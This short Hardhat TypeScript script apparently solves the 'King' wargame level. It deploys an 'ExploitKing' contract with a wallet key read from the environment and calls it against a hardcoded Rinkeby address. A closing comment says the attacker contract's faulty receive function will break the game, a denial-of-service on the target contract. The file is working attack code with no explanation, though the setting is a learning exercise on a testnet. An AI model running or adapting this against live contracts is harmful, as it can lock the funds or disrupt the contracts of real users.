import { ethers } from 'hardhat'
import { King } from '../types/typechain/King'
import { ExploitKing } from '../types/typechain/ExploitKing'

async function main() {
  const targetAddr = '0x5D6Ca0A686F93Ea95E632e6ef36E20b5eAC3de43'

  const attackerWallet = new ethers.Wallet(
    process.env.DEV_WALLET as string,
    ethers.provider
  )

  const factory = await ethers.getContractFactory('ExploitKing', attackerWallet)
  const exploit = (await factory.deploy()) as ExploitKing

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)

  console.log('Contract deployed, executing exploit...')
  const expTX = await exploit.execute(targetAddr, {
    value: 10000,
    gasLimit: 800000
  })
  console.log('https://rinkeby.etherscan.io/tx/' + expTX.hash)

  await expTX.wait()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
  // now submit via browser, faulty receive function will break game
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
